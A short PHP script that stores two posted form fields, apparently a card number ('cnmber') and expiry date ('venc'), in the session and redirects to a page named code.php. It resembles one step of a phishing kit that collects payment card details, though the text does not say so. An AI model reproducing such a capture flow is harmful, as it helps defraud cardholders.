<?php
session_start();



$_SESSION['cnmber'] = "$cnmber";
$_SESSION['venc'] = "$venc"; 
$cnmber = $_POST['cnmber'];
$venc = $_POST['venc'];




$_SESSION['cnmber'] = "$cnmber";
$_SESSION['venc'] = "$venc"; 

header('location: code.php');

?>